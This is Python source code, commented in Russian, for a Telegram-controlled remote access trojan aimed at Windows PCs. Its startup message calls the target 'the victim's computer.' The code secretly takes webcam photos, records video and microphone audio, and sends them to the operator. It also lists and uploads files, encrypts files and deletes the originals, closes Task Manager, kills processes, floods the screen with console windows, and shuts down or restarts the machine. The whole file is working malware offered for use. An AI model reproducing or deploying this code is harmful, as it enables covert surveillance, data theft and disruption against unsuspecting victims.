import os
import sys
import time
import random
import subprocess
import threading
import ctypes
import psutil
import shutil
import win32api
import win32con
import win32gui
import pyautogui
import cv2
import sounddevice as sd
import numpy as np
import telebot
from telebot import types
from cryptography.fernet import Fernet
from PIL import Image

# Конфигурация
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
AUTHORIZED_USER_ID = 123456789  # Замените на ваш Telegram ID
WEB_CAMERA_INDEX = 0  # Индекс веб-камеры (обычно 0)
SCREENSHOT_PATH = 'screenshot.jpg'
AUDIO_RECORD_PATH = 'audio_record.wav'
VIDEO_RECORD_PATH = 'video_record.avi'
ENCRYPTED_FILE_SUFFIX = '.encrypted'
KEY_FILE = 'encryption_key.key'

# Инициализация бота
bot = telebot.TeleBot(TOKEN)

# Глобальные переменные для состояний
current_directory = os.path.expanduser('~')
waiting_for_shutdown_confirmation = False
shutdown_confirmation_code = None
waiting_for_file_path = False
waiting_for_audio_duration = False
waiting_for_video_duration = False
waiting_for_process_pid = False
waiting_for_cursor_madness_duration = False
waiting_for_cmd_bomb_count = False
waiting_for_wallpaper_image = False
waiting_for_encrypt_path = False
waiting_for_decrypt_path = False
waiting_for_upload_path = False

# Проверка авторизации пользователя
def is_authorized(user_id):
    return user_id == AUTHORIZED_USER_ID

# Генерация ключа шифрования
def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as key_file:
            key_file.write(key)

# Загрузка ключа шифрования
def load_key():
    if not os.path.exists(KEY_FILE):
        generate_key()
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

# Шифрование файла
def encrypt_file(file_path):
    try:
        key = load_key()
        fernet = Fernet(key)
        
        with open(file_path, 'rb') as file:
            original = file.read()
        
        encrypted = fernet.encrypt(original)
        
        encrypted_path = file_path + ENCRYPTED_FILE_SUFFIX
        with open(encrypted_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
        
        os.remove(file_path)
        return True
    except Exception as e:
        print(f"Ошибка при шифровании: {e}")
        return False

# Дешифрование файла
def decrypt_file(encrypted_path):
    try:
        if not encrypted_path.endswith(ENCRYPTED_FILE_SUFFIX):
            return False
        
        key = load_key()
        fernet = Fernet(key)
        
        with open(encrypted_path, 'rb') as enc_file:
            encrypted = enc_file.read()
        
        decrypted = fernet.decrypt(encrypted)
        
        original_path = encrypted_path[:-len(ENCRYPTED_FILE_SUFFIX)]
        with open(original_path, 'wb') as dec_file:
            dec_file.write(decrypted)
        
        os.remove(encrypted_path)
        return True
    except Exception as e:
        print(f"Ошибка при дешифровании: {e}")
        return False

# Создание главного меню
def create_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn1 = types.KeyboardButton('📷 Сделать фото с веб-камеры')
    btn2 = types.KeyboardButton('🎥 Записать видео с веб-камеры')
    btn3 = types.KeyboardButton('🎤 Записать звук с микрофона')
    btn4 = types.KeyboardButton('❌ Закрыть текущее окно')
    btn5 = types.KeyboardButton('❌❌ Закрыть все окна')
    btn6 = types.KeyboardButton('🖼️ Сменить обои')
    btn7 = types.KeyboardButton('📂 Просмотреть текущую директорию')
    btn8 = types.KeyboardButton('📂 Перейти в директорию')
    btn9 = types.KeyboardButton('📄 Открыть файл')
    btn10 = types.KeyboardButton('📤 Загрузить файл')
    btn11 = types.KeyboardButton('🔒 Зашифровать файл')
    btn12 = types.KeyboardButton('🔓 Расшифровать файл')   
    btn13 = types.KeyboardButton('⏻ Выключить компьютер')
    btn14 = types.KeyboardButton('🔄 Перезагрузить компьютер')
    btn15 = types.KeyboardButton('ℹ️ Информация о ПК')
    btn16 = types.KeyboardButton('📊 Запущенные процессы')
    btn17 = types.KeyboardButton('💀 Прекратить процесс')
    btn18 = types.KeyboardButton('❌ Закрыть диспетчер задач')
    btn19 = types.KeyboardButton('🌀 Свести курсор с ума')
    btn20 = types.KeyboardButton('💣 CMD бомба')
    btn21 = types.KeyboardButton('📀 Открыть дисковод')
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, 
              btn11, btn12, btn13, btn14, btn15, btn16, btn17, btn18, btn19, 
              btn20, btn21)
    
    return markup

# Функция для записи видео с веб-камеры
def record_video(duration):
    cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
    if not cap.isOpened():
        return False
    
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(VIDEO_RECORD_PATH, fourcc, 20.0, (640, 480))
    
    start_time = time.time()
    while (time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    
    cap.release()
    out.release()
    return True

# Функция для записи звука с микрофона
def record_audio(duration):
    fs = 44100  # Частота дискретизации
    seconds = duration
    
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Ждем окончания записи
    
    # Сохраняем запись в файл
    from scipy.io.wavfile import write
    write(AUDIO_RECORD_PATH, fs, recording)
    return True

# Функция для закрытия всех окон
def close_all_windows():
    try:
        # Получаем дескриптор рабочего стола
        desktop = win32gui.GetDesktopWindow()
        
        # Перечисляем все дочерние окна рабочего стола
        def enum_windows_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd) and hwnd != desktop:
                windows.append(hwnd)
        
        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)
        
        # Закрываем все окна
        for hwnd in windows:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        
        return True
    except Exception as e:
        print(f"Ошибка при закрытии окон: {e}")
        return False

# Функция для смены обоев
def change_wallpaper(image_path):
    try:
        # Проверяем, что файл существует
        if not os.path.exists(image_path):
            return False
        
        # Конвертируем изображение в BMP, если нужно (для старых версий Windows)
        if not image_path.lower().endswith('.bmp'):
            img = Image.open(image_path)
            bmp_path = os.path.splitext(image_path)[0] + '.bmp'
            img.save(bmp_path, 'BMP')
            image_path = bmp_path
        
        # Устанавливаем обои
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"Ошибка при смене обоев: {e}")
        return False

# Функция для получения информации о системе
def get_system_info():
    try:
        info = []
        
        # Процессор
        cpu_info = f"Процессор: {os.cpu_count()} ядер, {psutil.cpu_percent()}% загрузки"
        info.append(cpu_info)
        
        # Память
        mem = psutil.virtual_memory()
        mem_info = f"Память: {mem.used / (1024**3):.2f} GB / {mem.total / (1024**3):.2f} GB ({mem.percent}%)"
        info.append(mem_info)
        
        # Диски
        disks = []
        for part in psutil.disk_partitions(all=False):
            usage = psutil.disk_usage(part.mountpoint)
            disk_info = f"Диск {part.device}: {usage.used / (1024**3):.2f} GB / {usage.total / (1024**3):.2f} GB ({usage.percent}%)"
            disks.append(disk_info)
        info.extend(disks)
        
        # Сетевая информация
        net_info = []
        for name, stats in psutil.net_if_stats().items():
            if stats.isup:
net_info.append(f"Сеть: {name} (скорость: {stats.speed} Mbps)")
        info.extend(net_info)
        
        # Батарея (если есть)
        try:
            battery = psutil.sensors_battery()
            if battery:
                battery_info = f"Батарея: {battery.percent}% ({'подключено' if battery.power_plugged else 'не подключено'})"
                info.append(battery_info)
        except:
            pass
        
        return "\n".join(info)
    except Exception as e:
        print(f"Ошибка при получении информации о системе: {e}")
        return "Не удалось получить информацию о системе"

# Функция для получения списка процессов
def get_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"PID: {proc.info['pid']}, {proc.info['name']}")
        return "\n".join(processes[:50])  # Ограничиваем вывод первыми 50 процессами
    except Exception as e:
        print(f"Ошибка при получении списка процессов: {e}")
        return "Не удалось получить список процессов"

# Функция для закрытия процесса по PID
def kill_process(pid):
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process.terminate()
        return True
    except Exception as e:
        print(f"Ошибка при закрытии процесса: {e}")
        return False

# Функция для закрытия диспетчера задач
def close_task_manager():
    try:
        # Получаем дескриптор окна диспетчера задач
        hwnd = win32gui.FindWindow(None, "Диспетчер задач")
        if hwnd:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return True
        return False
    except Exception as e:
        print(f"Ошибка при закрытии диспетчера задач: {e}")
        return False

# Функция для "сведения курсора с ума"
def cursor_madness(duration):
    try:
        start_time = time.time()
        while (time.time() - start_time) < duration:
            x, y = pyautogui.position()
            new_x = x + random.randint(-50, 50)
            new_y = y + random.randint(-50, 50)
            pyautogui.moveTo(new_x, new_y, duration=0.1)
            time.sleep(0.05)
        return True
    except Exception as e:
        print(f"Ошибка в функции cursor_madness: {e}")
        return False

# Функция для "CMD бомбы"
def cmd_bomb(count):
    try:
        count = min(int(count), 450)  # Ограничиваем максимальное количество
        for _ in range(count):
            subprocess.Popen('cmd', creationflags=subprocess.CREATE_NEW_CONSOLE)
        return True
    except Exception as e:
        print(f"Ошибка в функции cmd_bomb: {e}")
        return False

# Функция для открытия дисковода
def open_cd_drive():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        return True
    except Exception as e:
        print(f"Ошибка при открытии дисковода: {e}")
        return False

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Доступ запрещен!")
        return
    
    bot.send_message(message.chat.id, "Готов к работе, сер!", reply_markup=create_main_menu())

# Обработчик текстовых сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Доступ запрещен!")
        return
    
    global waiting_for_shutdown_confirmation, shutdown_confirmation_code
    global waiting_for_file_path, waiting_for_audio_duration, waiting_for_video_duration
    global waiting_for_process_pid, waiting_for_cursor_madness_duration
    global waiting_for_cmd_bomb_count, waiting_for_wallpaper_image
    global waiting_for_encrypt_path, waiting_for_decrypt_path, waiting_for_upload_path
    
    # Обработка подтверждения выключения
    if waiting_for_shutdown_confirmation:
        if message.text == str(shutdown_confirmation_code):
            bot.send_message(message.chat.id, "Выключаю компьютер...")
            os.system("shutdown /s /t 1")
            waiting_for_shutdown_confirmation = False
        else:
            bot.send_message(message.chat.id, "Неверный код подтверждения. Отмена выключения.", reply_markup=create_main_menu())
            waiting_for_shutdown_confirmation = False
        return
    
    # Обработка пути для загрузки файла
    if waiting_for_upload_path:
        try:
            path = message.text.strip()
            if not os.path.isdir(path):
                bot.send_message(message.chat.id, "Указанный путь не является директорией. Попробуйте снова.")
                return
            
            waiting_for_upload_path = False
            bot.send_message(message.chat.id, f"Теперь отправьте файл, который нужно загрузить в {path}")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_upload_path = False
        return
    
    # Обработка пути для шифрования файла
    if waiting_for_encrypt_path:
        try:
            path = message.text.strip()
            if not os.path.isfile(path):
                bot.send_message(message.chat.id, "Файл не найден. Попробуйте снова.")
                return
            
            if encrypt_file(path):
                bot.send_message(message.chat.id, "Файл успешно зашифрован!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось зашифровать файл.", reply_markup=create_main_menu())
            
            waiting_for_encrypt_path = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_encrypt_path = False
        return
    
    # Обработка пути для дешифрования файла
    if waiting_for_decrypt_path:
        try:
            path = message.text.strip()
            if not os.path.isfile(path):
                bot.send_message(message.chat.id, "Файл не найден. Попробуйте снова.")
                return
            
            if decrypt_file(path):
                bot.send_message(message.chat.id, "Файл успешно расшифрован!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось расшифровать файл.", reply_markup=create_main_menu())
            
            waiting_for_decrypt_path = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_decrypt_path = False
        return
    
    # Обработка PID процесса для закрытия
    if waiting_for_process_pid:
        try:
            pid = message.text.strip()
            if kill_process(pid):
                bot.send_message(message.chat.id, "Процесс успешно завершен!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось завершить процесс.", reply_markup=create_main_menu())
            
            waiting_for_process_pid = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_process_pid = False
        return
    
    # Обработка длительности для "сведения курсора с ума"
    if waiting_for_cursor_madness_duration:
        try:
            duration = int(message.text.strip())
            if duration <= 0 or duration > 60:
                bot.send_message(message.chat.id, "Длительность должна быть от 1 до 60 секунд.")
                return
            
            bot.send_message(message.chat.id, f"Курсор будет 'сходить с ума' в течение {duration} секунд...")
            
            # Запускаем в отдельном потоке, чтобы не блокировать бота
            threading.Thread(target=cursor_madness, args=(duration,)).start()
            
            waiting_for_cursor_madness_duration = False
            bot.send_message(message.chat.id, "Готово!", reply_markup=create_main_menu())
        except ValueError:
            bot.send_message(message.chat.id, "Пожалуйста, введите число.")
            waiting_for_cursor_madness_duration = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_cursor_madness_duration = False
        return
    
    # Обработка количества для "CMD бомбы"
    if waiting_for_cmd_bomb_count:
        try:
            count = int(message.text.strip())
            if count <= 0 or count > 450:
                bot.send_message(message.chat.id, "Количество должно быть от 1 до 450.")
                return
            
            if cmd_bomb(count):
                bot.send_message(message.chat.id, f"Запущено {count} окон CMD!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось запустить CMD бомбу.", reply_markup=create_main_menu())
            
            waiting_for_cmd_bomb_count = False
        except ValueError:
            bot.send_message(message.chat.id, "Пожалуйста, введите число.")
            waiting_for_cmd_bomb_count = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_cmd_bomb_count = False
        return
    
    # Обработка длительности записи звука
    if waiting_for_audio_duration:
        try:
            duration = int(message.text.strip())
            if duration <= 0 or duration > 60:
                bot.send_message(message.chat.id, "Длительность должна быть от 1 до 60 секунд.")
                return
            
            bot.send_message(message.chat.id, f"Записываю звук в течение {duration} секунд...")
            
            if record_audio(duration):
                with open(AUDIO_RECORD_PATH, 'rb') as audio_file:
                    bot.send_audio(message.chat.id, audio_file)
                os.remove(AUDIO_RECORD_PATH)
            else:
                bot.send_message(message.chat.id, "Не удалось записать звук.")
            
            waiting_for_audio_duration = False
            bot.send_message(message.chat.id, "Готово!", reply_markup=create_main_menu())
        except ValueError:
            bot.send_message(message.chat.id, "Пожалуйста, введите число.")
            waiting_for_audio_duration = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_audio_duration = False
        return
    
    # Обработка длительности записи видео
    if waiting_for_video_duration:
        try:
            duration = int(message.text.strip())
            if duration <= 0 or duration > 30:
                bot.send_message(message.chat.id, "Длительность должна быть от 1 до 30 секунд.")
                return
            
            bot.send_message(message.chat.id, f"Записываю видео в течение {duration} секунд...")
            
            if record_video(duration):
                with open(VIDEO_RECORD_PATH, 'rb') as video_file:
                    bot.send_video(message.chat.id, video_file)
                os.remove(VIDEO_RECORD_PATH)
            else:
                bot.send_message(message.chat.id, "Не удалось записать видео.")
            
            waiting_for_video_duration = False
            bot.send_message(message.chat.id, "Готово!", reply_markup=create_main_menu())
        except ValueError:
            bot.send_message(message.chat.id, "Пожалуйста, введите число.")
            waiting_for_video_duration = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_video_duration = False
        return
    
    # Обработка пути к файлу
    if waiting_for_file_path:
        try:
            path = message.text.strip()
            if not os.path.exists(path):
                bot.send_message(message.chat.id, "Файл или директория не найдены. Попробуйте снова.")
                return
            
            if os.path.isfile(path):
                os.startfile(path)
                bot.send_message(message.chat.id, "Файл успешно открыт!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Указанный путь является директорией, а не файлом.", reply_markup=create_main_menu())
            
            waiting_for_file_path = False
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_file_path = False
        return
    
    # Обработка команд из меню
    if message.text == '📷 Сделать фото с веб-камеры':
        try:
            cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                cv2.imwrite(SCREENSHOT_PATH, frame)
                with open(SCREENSHOT_PATH, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(SCREENSHOT_PATH)
            else:
                bot.send_message(message.chat.id, "Не удалось получить фото с веб-камеры.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
    
    elif message.text == '🎥 Записать видео с веб-камеры':
        waiting_for_video_duration = True
        bot.send_message(message.chat.id, "Введите длительность записи видео в секундах (максимум 30):")
    
    elif message.text == '🎤 Записать звук с микрофона':
        waiting_for_audio_duration = True
        bot.send_message(message.chat.id, "Введите длительность записи звука в секундах (максимум 60):")
    
    elif message.text == '❌ Закрыть текущее окно':
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                bot.send_message(message.chat.id, "Текущее окно закрыто!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось определить текущее окно.", reply_markup=create_main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}", reply_markup=create_main_menu())
    
    elif message.text == '❌❌ Закрыть все окна':
        if close_all_windows():
            bot.send_message(message.chat.id, "Все окна закрыты!", reply_markup=create_main_menu())
        else:
            bot.send_message(message.chat.id, "Не удалось закрыть все окна.", reply_markup=create_main_menu())
    
    elif message.text == '🖼️ Сменить обои':
        waiting_for_wallpaper_image = True
        bot.send_message(message.chat.id, "Отправьте изображение для установки в качестве обоев:")
    
    elif message.text == '📂 Просмотреть текущую директорию':
        try:
            files = []
            for item in os.listdir(current_directory):
                item_path = os.path.join(current_directory, item)
                if os.path.isdir(item_path):
                    files.append(f"{item} *папка*")
                else:
                    files.append(f"{item}")
            
            response = f"Содержимое директории {current_directory}:\n\n" + "\n".join(files)
            bot.send_message(message.chat.id, response, reply_markup=create_main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}", reply_markup=create_main_menu())
    
    elif message.text == '📂 Перейти в директорию':
        bot.send_message(message.chat.id, f"Текущая директория: {current_directory}\nВведите полный путь к новой директории:")
        waiting_for_file_path = True
    
    elif message.text == '📄 Открыть файл':
        bot.send_message(message.chat.id, "Пример: C:/Users/User/документ.txt\nВведите полный путь к файлу:")
        waiting_for_file_path = True
    
    elif message.text == '📤 Загрузить файл':
        waiting_for_upload_path = True
        bot.send_message(message.chat.id, "Введите полный путь к папке, в которую нужно загрузить файл:")
    
    elif message.text == '🔒 Зашифровать файл':
        waiting_for_encrypt_path = True
        bot.send_message(message.chat.id, "Пример: C:/Users/User/секрет.txt\nВведите полный путь к файлу для шифрования:")
    elif message.text == '🔓 Расшифровать файл':
        waiting_for_decrypt_path = True
        bot.send_message(message.chat.id, "Пример: C:/Users/User/секрет.txt.encrypted\nВведите полный путь к зашифрованному файлу:")
    
    elif message.text == '⏻ Выключить компьютер':
        shutdown_confirmation_code = random.randint(10, 110)
        waiting_for_shutdown_confirmation = True
        bot.send_message(message.chat.id, f"Для подтверждения выключения введите код: {shutdown_confirmation_code}\nЕсли передумали - просто игнорируйте это сообщение.")
    
    elif message.text == '🔄 Перезагрузить компьютер':
        os.system("shutdown /r /t 1")
        bot.send_message(message.chat.id, "Компьютер перезагружается...")
    
    elif message.text == 'ℹ️ Информация о ПК':
        info = get_system_info()
        bot.send_message(message.chat.id, info, reply_markup=create_main_menu())
    
    elif message.text == '📊 Запущенные процессы':
        processes = get_processes()
        bot.send_message(message.chat.id, processes, reply_markup=create_main_menu())
    
    elif message.text == '💀 Прекратить процесс':
        waiting_for_process_pid = True
        bot.send_message(message.chat.id, "Введите PID процесса для завершения (например, 4080):")
    
    elif message.text == '❌ Закрыть диспетчер задач':
        if close_task_manager():
            bot.send_message(message.chat.id, "Диспетчер задач закрыт!", reply_markup=create_main_menu())
        else:
            bot.send_message(message.chat.id, "Диспетчер задач не был найден или уже закрыт.", reply_markup=create_main_menu())
    
    elif message.text == '🌀 Свести курсор с ума':
        waiting_for_cursor_madness_duration = True
        bot.send_message(message.chat.id, "Введите длительность в секундах (максимум 60):")
    
    elif message.text == '💣 CMD бомба':
        waiting_for_cmd_bomb_count = True
        bot.send_message(message.chat.id, "Введите количество CMD окон (максимум 450):")
    
    elif message.text == '📀 Открыть дисковод':
        if open_cd_drive():
            bot.send_message(message.chat.id, "Дисковод открыт!", reply_markup=create_main_menu())
        else:
            bot.send_message(message.chat.id, "Не удалось открыть дисковод.", reply_markup=create_main_menu())
    
    else:
        bot.send_message(message.chat.id, "Неизвестная команда. Используйте меню.", reply_markup=create_main_menu())

# Обработчик получения документов (для загрузки файлов)
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Доступ запрещен!")
        return
    
    global waiting_for_wallpaper_image, waiting_for_upload_path, current_directory
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        if waiting_for_wallpaper_image:
            # Сохраняем изображение для обоев
            image_path = 'wallpaper.jpg'
            with open(image_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            if change_wallpaper(image_path):
                bot.send_message(message.chat.id, "Обои успешно изменены!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось изменить обои.", reply_markup=create_main_menu())
            
            waiting_for_wallpaper_image = False
            if os.path.exists(image_path):
                os.remove(image_path)
        
        elif waiting_for_upload_path:
            # Сохраняем загружаемый файл
            file_name = message.document.file_name
            file_path = os.path.join(current_directory, file_name)
            
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            bot.send_message(message.chat.id, f"Файл {file_name} успешно загружен в {current_directory}!", reply_markup=create_main_menu())
            waiting_for_upload_path = False
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
        waiting_for_wallpaper_image = False
        waiting_for_upload_path = False

# Обработчик получения фото (альтернативный способ для обоев)
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Доступ запрещен!")
        return
    
    global waiting_for_wallpaper_image
    
    if waiting_for_wallpaper_image:
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            image_path = 'wallpaper.jpg'
            with open(image_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            if change_wallpaper(image_path):
                bot.send_message(message.chat.id, "Обои успешно изменены!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "Не удалось изменить обои.", reply_markup=create_main_menu())
            
            waiting_for_wallpaper_image = False
            if os.path.exists(image_path):
                os.remove(image_path)
        
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
            waiting_for_wallpaper_image = False

# Функция для отправки уведомления о включении компьютера
def send_startup_notification():
    try:
        bot.send_message(AUTHORIZED_USER_ID, "Компьютер жертвы включен, нажмите /start для начала работы")
    except Exception as e:
        print(f"Ошибка при отправке уведомления о включении: {e}")

# Функция для отправки уведомления о выключении компьютера
def send_shutdown_notification():
    try:
        bot.send_message(AUTHORIZED_USER_ID, "Эх, компьютер выключается")
    except Exception as e:
        print(f"Ошибка при отправке уведомления о выключении: {e}")

# Проверка, запущен ли скрипт при старте системы
if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
    # Если это собранный exe файл (например, через PyInstaller)
    send_startup_notification()

# Основной цикл бота
if __name__ == '__main__':
    try:
        # Отправляем уведомление о включении
        send_startup_notification()
        
        # Запускаем бота
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        # Отправляем уведомление о выключении
        send_shutdown_notification()
        sys.exit(0)
    except Exception as e:
        print(f"Ошибка в основном цикле: {e}")
        time.sleep(10)
        # Пытаемся перезапустить бота при ошибке
        os.execv(sys.executable, ['python'] + sys.argv)